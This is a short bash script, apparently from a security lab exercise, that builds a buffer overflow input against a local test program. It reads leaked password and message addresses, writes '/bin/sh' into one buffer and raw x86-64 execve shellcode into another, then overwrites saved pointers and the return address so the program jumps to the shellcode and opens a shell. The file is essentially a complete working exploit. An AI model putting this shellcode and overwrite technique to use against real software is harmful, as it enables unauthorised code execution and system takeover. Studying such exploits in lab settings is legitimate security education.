#!/bin/bash

#Gets the correct password address to write into
echo -ne "\n\n\n" | ./modified > \dev\null 2> passNoGdb.txt
PASSADDRESS=`cat passNoGdb.txt`
MSGADDRESS=`cat msg.txt`

EXE=`cat myShellCode.txt`

#Converts to proper hex and uses to format attack string
#MESSAGEHEX=`python newConvert.py $ADDRESS`
SHELLHEX=`python add3AndConvert.py $PASSADDRESS`
PASSHEX=`python newConvert.py $PASSADDRESS`
MSGHEX=`python newConvert.py $MSGADDRESS`

#Store /bin/sh/ in the message and leave a blank user 
echo -ne "/bin/sh\0\n\n\0\0\0" > part5NoGdbinput.txt

#Place shellcode into password
#cat myShellCode.txt >> part5input.txt
#python -c "print '\x48\xc7\xc0\x3b\x00\x00\x00\x48\xc7\xc7\x80\x10\x60\x00\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\x00\x00\x00\x00\x0f\x05'," >> part5NoGdbinput.txt

echo -ne "\x48\xc7\xc0\x3b\x00\x00\x00\x48\xc7\xc7\x80\x10\x60\x00\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\x00\x00\x00\x00\x0f\x05" >> part5NoGdbinput.txt

#Continues in buffer - rest of evil, good, ebp, and return value (pointing to shell)
echo -ne "EVILLLL$MSGHEX\0\0\0\0\0$PASSHEX\0\0$SHELLHEX\0\0" >> part5NoGdbinput.txt 

#Runs executable with proper string
#./a.out < part5input.txt

